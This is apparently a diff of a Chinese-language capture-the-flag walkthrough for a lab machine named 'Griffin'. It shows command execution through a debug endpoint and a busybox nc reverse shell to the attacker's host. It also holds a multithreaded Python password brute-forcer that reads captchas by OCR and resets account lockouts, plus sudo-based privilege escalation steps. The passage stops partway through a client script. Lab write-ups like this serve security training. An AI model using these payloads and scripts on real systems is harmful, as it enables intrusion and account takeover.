 Peter Griffin’s got your back with top-notch service.
-Don’t mess this up, or Lois is gonna be pissed!
-</code></pre>
+Don’t mess this up, or Lois is gonna be pissed<span class="pl-k">!</span></pre></div>
 <p>使用<code class="notranslate">dirsearch</code>工具进行目录扫描，发现了<code class="notranslate">/info</code>和<code class="notranslate">/debug</code>两个路径。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dirsearch -u http://192.168.205.132:8080
 ...
 [09:28:14] 403 -   23B  - /debug
 [09:28:18] 200 -   49B  - /info
-...
-</code></pre>
+...</pre></div>
 <h2><strong>2.2 远程命令执行（RCE）</strong></h2>
 <p>访问<code class="notranslate">/info</code>路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.132:8080/info
 System Info: Diagnostic token = BetaToken123
 ...
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.132:8080/info
-System Info: Diagnostic token = CyberCorpDebug123
-</code></pre>
+System Info: Diagnostic token = CyberCorpDebug123</pre></div>
 <p>访问<code class="notranslate">/debug</code>路径提示缺少<code class="notranslate">token</code>参数。尝试将从<code class="notranslate">/info</code>获取的令牌作为参数提供，页面提示缺少<code class="notranslate">run</code>命令。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
-Missing run command
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.132:8080/debug?token=CyberCorpDebug123<span class="pl-pds">'</span></span>
+Missing run <span class="pl-c1">command</span></pre></div>
 <p>这表明该端点可能存在命令执行漏洞。通过<code class="notranslate">run</code>参数传递<code class="notranslate">id</code>命令进行测试，成功执行并返回了结果。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=id'
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=id<span class="pl-pds">'</span></span>
+uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)</pre></div>
 <p><strong>注意</strong>：由于令牌是随机的，需要先访问<code class="notranslate">/info</code>获取有效令牌，再立即用于<code class="notranslate">/debug</code>端点。</p>
 <h2><strong>2.3 获取反向Shell</strong></h2>
 <p>在Kali上设置<code class="notranslate">netcat</code>监听8888端口。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nc -lvnp 8888
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888</pre></div>
 <p>利用已发现的RCE漏洞，执行一个反向shell命令。这里使用<code class="notranslate">busybox nc</code>来建立连接。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.132:8080/debug<span class="pl-k">?</span>token=CyberCorpDebug123<span class="pl-k">&amp;</span>run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash</pre></div>
 <p>成功接收到反向shell，当前用户为<code class="notranslate">lois</code>。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">listening on [any] 8888 ...
+<div class="highlight highlight-source-shell"><pre class="notranslate">listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
 id
-uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
-</code></pre>
+uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)</pre></div>
 <p>随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
 Ctrl+Z
-stty raw -echo; fg
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
 reset xterm
-export TERM=xterm
-export SHELL=/bin/bash
-stty rows 36 columns 178
-</code></pre>
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 36 columns 178</pre></div>
 <h1><strong>三、权限提升</strong></h1>
 <h2><strong>3.1 本地枚举</strong></h2>
 <p>获取<code class="notranslate">user.txt</code>中的第一个flag。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">lois@Griffin:/home/lois$ cat user.txt
-flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/home/lois$ cat user.txt
+flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</pre></div>
 <p>使用<code class="notranslate">sudo -l</code>检查<code class="notranslate">lois</code>用户的sudo权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">lois@Griffin:/home/lois$ sudo -l
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/home/lois$ sudo -l
 ...
 User lois may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log</pre></div>
 <p><code class="notranslate">lois</code>可以免密使用<code class="notranslate">cat</code>命令读取<code class="notranslate">/root/startup.log</code>。检查网络连接情况，发现除了公网的<code class="notranslate">8080</code>和<code class="notranslate">22</code>端口外，还在本地<code class="notranslate">127.0.0.1</code>上监听了多个端口，包括一个<code class="notranslate">80</code>端口。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">lois@Griffin:/opt$ ss -tnlp
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ ss -tnlp
 State                   Recv-Q                  Send-Q               Local Address:Port
 ...
 LISTEN                  0                       5                          0.0.0.0:8080
 LISTEN                  0                       128                        127.0.0.1:80
-...
-</code></pre>
+...</pre></div>
 <h2><strong>3.2 端口转发与Web二次渗透</strong></h2>
 <p>由于<code class="notranslate">80</code>端口只在本地监听，我们无法直接访问。使用<code class="notranslate">socat</code>将本地的<code class="notranslate">80</code>端口转发到<code class="notranslate">8000</code>端口，以便从外部访问。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 <span class="pl-k">&amp;</span></pre></div>
 <p>访问转发后的<code class="notranslate">http://192.168.205.132:8000/</code>，这是一个关于"Family Guy"的网站。再次使用<code class="notranslate">dirsearch</code>进行目录扫描，发现<code class="notranslate">robots.txt</code>文件。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.132:8000/robots.txt
-User-agent: *
+User-agent: <span class="pl-k">*</span>
 Disallow: /family
 
 ...
 
-rockyou: world's best dictionary, hands down!
-</code></pre>
+rockyou: world<span class="pl-s"><span class="pl-pds">'</span>s best dictionary, hands down!</span></pre></div>
 <p><code class="notranslate">robots.txt</code>禁止访问<code class="notranslate">/family</code>路径，并暗示<code class="notranslate">rockyou</code>字典可能会派上用场。</p>
 <h2><strong>3.3 登录爆破 (lois -&gt; meg)</strong></h2>
 <p>访问<code class="notranslate">/family</code>路径是一个登录页面，包含用户名、密码和验证码。页面提示<code class="notranslate">brian</code>用户每5次尝试后会被锁定，需要重置。</p>
 <p>为此，编写了一个Python脚本，使用<code class="notranslate">ddddocr</code>库识别验证码，并结合字典对<code class="notranslate">brian</code>用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。</p>
-<pre lang="python" class="notranslate"><code class="notranslate">import requests
-import ddddocr
-from concurrent.futures import ThreadPoolExecutor
-from threading import Lock
-import queue
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>
+<span class="pl-k">import</span> <span class="pl-s1">ddddocr</span>
+<span class="pl-k">from</span> <span class="pl-s1">concurrent</span>.<span class="pl-s1">futures</span> <span class="pl-k">import</span> <span class="pl-v">ThreadPoolExecutor</span>
+<span class="pl-k">from</span> <span class="pl-s1">threading</span> <span class="pl-k">import</span> <span class="pl-v">Lock</span>
+<span class="pl-k">import</span> <span class="pl-s1">queue</span>
 
-url = "http://192.168.205.132:8000/family/"
-cap_url = "http://192.168.205.132:8000/family/captcha.php"
-rst_url = "http://192.168.205.132:8000/family/?reset=1"
-user = "brian"
-dict_file = "5000q.txt"
-max_workers = 2
+<span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/"</span>
+<span class="pl-s1">cap_url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/captcha.php"</span>
+<span class="pl-s1">rst_url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/?reset=1"</span>
+<span class="pl-s1">user</span> <span class="pl-c1">=</span> <span class="pl-s">"brian"</span>
+<span class="pl-s1">dict_file</span> <span class="pl-c1">=</span> <span class="pl-s">"5000q.txt"</span>
+<span class="pl-s1">max_workers</span> <span class="pl-c1">=</span> <span class="pl-c1">2</span>
 
-ocr = ddddocr.DdddOcr()
-pw_q = queue.Queue()
-found = queue.Queue(maxsize=1)
-pr_lock = Lock()
-total = 0
-MAX_RETRY = 3   # 每个密码最多重试 3 次
+<span class="pl-s1">ocr</span> <span class="pl-c1">=</span> <span class="pl-s1">ddddocr</span>.<span class="pl-c1">DdddOcr</span>()
+<span class="pl-s1">pw_q</span> <span class="pl-c1">=</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Queue</span>()
+<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Queue</span>(<span class="pl-s1">maxsize</span><span class="pl-c1">=</span><span class="pl-c1">1</span>)
+<span class="pl-s1">pr_lock</span> <span class="pl-c1">=</span> <span class="pl-en">Lock</span>()
+<span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+<span class="pl-c1">MAX_RETRY</span> <span class="pl-c1">=</span> <span class="pl-c1">3</span>   <span class="pl-c"># 每个密码最多重试 3 次</span>
 
 
-def worker():
-    global total
-    s = requests.Session()
-    s.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
-        "Accept": "text/html,*/*",
-        "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.2",
-        "Connection": "keep-alive",
-        "Referer": url,
-        "Upgrade-Insecure-Requests": "1"
+<span class="pl-k">def</span> <span class="pl-en">worker</span>():
+    <span class="pl-k">global</span> <span class="pl-s1">total</span>
+    <span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">Session</span>()
+    <span class="pl-s1">s</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">update</span>({
+        <span class="pl-s">"User-Agent"</span>: <span class="pl-s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"</span>,
+        <span class="pl-s">"Accept"</span>: <span class="pl-s">"text/html,*/*"</span>,
+        <span class="pl-s">"Accept-Language"</span>: <span class="pl-s">"zh-CN,zh;q=0.8,en;q=0.2"</span>,
+        <span class="pl-s">"Connection"</span>: <span class="pl-s">"keep-alive"</span>,
+        <span class="pl-s">"Referer"</span>: <span class="pl-s1">url</span>,
+        <span class="pl-s">"Upgrade-Insecure-Requests"</span>: <span class="pl-s">"1"</span>
     })
 
-    tries = 0
-    while True:
-        if not found.empty():
-            return
-        try:
-            pw, retry = pw_q.get_nowait()
-            tries += 1
+    <span class="pl-s1">tries</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+    <span class="pl-k">while</span> <span class="pl-c1">True</span>:
+        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>.<span class="pl-c1">empty</span>():
+            <span class="pl-k">return</span>
+        <span class="pl-k">try</span>:
+            <span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">=</span> <span class="pl-s1">pw_q</span>.<span class="pl-c1">get_nowait</span>()
+            <span class="pl-s1">tries</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
 
-            cap_img = s.get(cap_url, timeout=5).content
-            cap = ocr.classification(cap_img).strip()
+            <span class="pl-s1">cap_img</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-s1">cap_url</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>).<span class="pl-c1">content</span>
+            <span class="pl-s1">cap</span> <span class="pl-c1">=</span> <span class="pl-s1">ocr</span>.<span class="pl-c1">classification</span>(<span class="pl-s1">cap_img</span>).<span class="pl-c1">strip</span>()
 
-            if len(cap) != 4:
-                if retry &lt; MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
+            <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">cap</span>) <span class="pl-c1">!=</span> <span class="pl-c1">4</span>:
+                <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                    <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+                <span class="pl-k">continue</span>
 
-            r = s.post(url, data={"username": user, "password": pw, "captcha": cap}, timeout=5)
+            <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span>{<span class="pl-s">"username"</span>: <span class="pl-s1">user</span>, <span class="pl-s">"password"</span>: <span class="pl-s1">pw</span>, <span class="pl-s">"captcha"</span>: <span class="pl-s1">cap</span>}, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
 
-            with pr_lock:
-                total += 1
-                n = total
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+                <span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span>
 
-            res = r.text
+            <span class="pl-s1">res</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">text</span>
 
-            # 账号被锁定
-            if "ACCOUNT TEMPORARILY LOCKED!" in res:
-                with pr_lock:
-                    print(f"[{n:4d}] 🚫 {pw:&lt;12} | 🔤 {cap} | 原因: 账号被锁定 → reset")
-                try:
-                    s.get(rst_url, timeout=5)
-                except requests.RequestException:
-                    pass
-                if retry &lt; MAX_RETRY:
-                    pw_q.put((pw, retry + 1))
-                continue
+            <span class="pl-c"># 账号被锁定</span>
+            <span class="pl-k">if</span> <span class="pl-s">"ACCOUNT TEMPORARILY LOCKED!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                    <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span>:4d<span class="pl-kos">}</span></span>] 🚫 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span>:&lt;12<span class="pl-kos">}</span></span> | 🔤 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span> | 原因: 账号被锁定 → reset"</span>)
+                <span class="pl-k">try</span>:
+                    <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-s1">rst_url</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
+                <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">RequestException</span>:
+                    <span class="pl-k">pass</span>
+                <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                    <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+                <span class="pl-k">continue</span>
 
-            # 破解成功
-            if "Invalid security code!" not in res and "Incorrect password!" not in res:
-                found.put((user, pw, cap, n))
-                with pr_lock:
-                    print(f"\n[+] 🎉 破解成功！🎉\n    用户名: {user}\n    密码: {pw}\n    验证码: {cap}\n    尝试: {n}")
-                return
+            <span class="pl-c"># 破解成功</span>
+            <span class="pl-k">if</span> <span class="pl-s">"Invalid security code!"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">res</span> <span class="pl-c1">and</span> <span class="pl-s">"Incorrect password!"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">found</span>.<span class="pl-c1">put</span>((<span class="pl-s1">user</span>, <span class="pl-s1">pw</span>, <span class="pl-s1">cap</span>, <span class="pl-s1">n</span>))
+                <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[+] 🎉 破解成功！🎉<span class="pl-cce">\n</span>    用户名: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    密码: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    验证码: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    尝试: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span><span class="pl-kos">}</span></span>"</span>)
+                <span class="pl-k">return</span>
 
-            # 失败原因输出
-            reason = "未知原因"
-            if "Invalid security code!" in res:
-                reason = "验证码错误"
-            elif "Incorrect password!" in res:
-                reason = "密码错误"
+            <span class="pl-c"># 失败原因输出</span>
+            <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"未知原因"</span>
+            <span class="pl-k">if</span> <span class="pl-s">"Invalid security code!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"验证码错误"</span>
+            <span class="pl-k">elif</span> <span class="pl-s">"Incorrect password!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"密码错误"</span>
 
-            with pr_lock:
-                print(f"[{n:4d}] ❌ {pw:&lt;12} | 🔤 {cap} | 原因: {reason}")
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span>:4d<span class="pl-kos">}</span></span>] ❌ <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span>:&lt;12<span class="pl-kos">}</span></span> | 🔤 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span> | 原因: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">reason</span><span class="pl-kos">}</span></span>"</span>)
 
-        except queue.Empty:
-            break
-        except requests.RequestException:
-            if retry &lt; MAX_RETRY:
-                pw_q.put((pw, retry + 1))
-        except Exception as e:
-            with pr_lock:
-                print(f"[!] 线程异常: {e}")
+        <span class="pl-k">except</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Empty</span>:
+            <span class="pl-k">break</span>
+        <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">RequestException</span>:
+            <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+        <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-en">print</span>(<span class="pl-s">f"[!] 线程异常: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">e</span><span class="pl-kos">}</span></span>"</span>)
 
 
-if __name__ == "__main__":
-    try:
-        with open(dict_file, encoding="utf-8") as f:
-            for p in [x.strip() for x in f if x.strip()]:
-                pw_q.put((p, 0))   # (密码, 重试次数)
-    except:
-        print(f"[-] 字典未找到: {dict_file}")
-        exit(1)
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-k">try</span>:
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">dict_file</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">"utf-8"</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-k">for</span> <span class="pl-s1">p</span> <span class="pl-c1">in</span> [<span class="pl-s1">x</span>.<span class="pl-c1">strip</span>() <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span> <span class="pl-k">if</span> <span class="pl-s1">x</span>.<span class="pl-c1">strip</span>()]:
+                <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">p</span>, <span class="pl-c1">0</span>))   <span class="pl-c"># (密码, 重试次数)</span>
+    <span class="pl-k">except</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 字典未找到: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">dict_file</span><span class="pl-kos">}</span></span>"</span>)
+        <span class="pl-en">exit</span>(<span class="pl-c1">1</span>)
 
-    print(f"[*] 开始爆破 | 用户: {user} | 字典: {dict_file} | 总数: {pw_q.qsize()} | 线程: {max_workers}\n")
+    <span class="pl-en">print</span>(<span class="pl-s">f"[*] 开始爆破 | 用户: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span> | 字典: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">dict_file</span><span class="pl-kos">}</span></span> | 总数: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw_q</span>.<span class="pl-c1">qsize</span>()<span class="pl-kos">}</span></span> | 线程: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">max_workers</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>"</span>)
 
-    with ThreadPoolExecutor(max_workers=max_workers) as ex:
-        list(ex.map(lambda _: worker(), range(max_workers)))
+    <span class="pl-k">with</span> <span class="pl-en">ThreadPoolExecutor</span>(<span class="pl-s1">max_workers</span><span class="pl-c1">=</span><span class="pl-s1">max_workers</span>) <span class="pl-k">as</span> <span class="pl-s1">ex</span>:
+        <span class="pl-en">list</span>(<span class="pl-s1">ex</span>.<span class="pl-c1">map</span>(<span class="pl-k">lambda</span> <span class="pl-s1">_</span>: <span class="pl-en">worker</span>(), <span class="pl-en">range</span>(<span class="pl-s1">max_workers</span>)))
 
-    if found.empty():
-        print(f"\n[-] ❌ 爆破失败")
-</code></pre>
+    <span class="pl-k">if</span> <span class="pl-s1">found</span>.<span class="pl-c1">empty</span>():
+        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[-] ❌ 爆破失败"</span>)</pre></div>
 <p>经过爆破，成功获得<code class="notranslate">brian</code>用户的密码。</p>
 <pre class="notranslate"><code class="notranslate">[+] 🎉 破解成功！🎉
     用户名: brian
@@ -1209,82 +312,74 @@ if __name__ == "__main__":
 <pre class="notranslate"><code class="notranslate">meg:lovelyfamily
 </code></pre>
 <p>使用<code class="notranslate">su</code>命令和该密码成功切换到<code class="notranslate">meg</code>用户。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">lois@Griffin:/opt$ su meg
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ su meg
 Password: lovelyfamily
-meg@Griffin:~$ id
-uid=1001(meg) gid=1001(meg) groups=1001(meg)
-</code></pre>
+meg@Griffin:<span class="pl-k">~</span>$ id
+uid=1001(meg) gid=1001(meg) groups=1001(meg)</pre></div>
 <h2><strong>3.4 Sudo提权 (meg -&gt; peter)</strong></h2>
 <p>检查<code class="notranslate">meg</code>用户的sudo权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">meg@Griffin:~$ sudo -l
+<div class="highlight highlight-source-shell"><pre class="notranslate">meg@Griffin:<span class="pl-k">~</span>$ sudo -l
 ...
 User meg may run the following commands on Griffin:
-    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py</pre></div>
 <p><code class="notranslate">meg</code>可以免密以root权限执行<code class="notranslate">/root/game.py</code>脚本。执行该脚本后，它会在<code class="notranslate">6666</code>端口上启动一个监听服务。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
-Server listening on port 6666...
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">meg@Griffin:<span class="pl-k">~</span>$ sudo /usr/bin/python3 /root/game.py
+Server listening on port 6666...</pre></div>
 <p>该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。</p>
-<pre lang="python" class="notranslate"><code class="notranslate">import socket
-import re
-import hashlib
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">socket</span>
+<span class="pl-k">import</span> <span class="pl-s1">re</span>
+<span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
 
-s = socket.socket()
-s.connect(("192.168.205.132", 6666))
+<span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">socket</span>.<span class="pl-c1">socket</span>()
+<span class="pl-s1">s</span>.<span class="pl-c1">connect</span>((<span class="pl-s">"192.168.205.132"</span>, <span class="pl-c1">6666</span>))
 
-data = s.recv(4096).decode()
-print(data)
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
 
-match = re.search(r"\((\d+) \* (\d+)\) // (\d+)", data)
-a, b, c = map(int, match.groups())
-ans1 = str((a * b) // c)
-s.send((ans1 + "\n").encode())
+<span class="pl-s1">match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r"\((\d+) \* (\d+)\) // (\d+)"</span>, <span class="pl-s1">data</span>)
+<span class="pl-s1">a</span>, <span class="pl-s1">b</span>, <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-en">map</span>(<span class="pl-s1">int</span>, <span class="pl-s1">match</span>.<span class="pl-c1">groups</span>())
+<span class="pl-s1">ans1</span> <span class="pl-c1">=</span> <span class="pl-en">str</span>((<span class="pl-s1">a</span> <span class="pl-c1">*</span> <span class="pl-s1">b</span>) <span class="pl-c1">//</span> <span class="pl-s1">c</span>)
+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>((<span class="pl-s1">ans1</span> <span class="pl-c1">+</span> <span class="pl-s">"<span class="pl-cce">\n</span>"</span>).<span class="pl-c1">encode</span>())
 
-data = s.recv(4096).decode()
-print(data)
-s.send(b"flag{fakeflag}\n")
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>(<span class="pl-s">b"flag{fakeflag}<span class="pl-cce">\n</span>"</span>)
 
-data = s.recv(4096).decode()
-print(data)
-x = re.search(r"MD5\((\d+) \+ UNIX timestamp: (\d+)\)", data)
-param = x.group(1) + x.group(2)
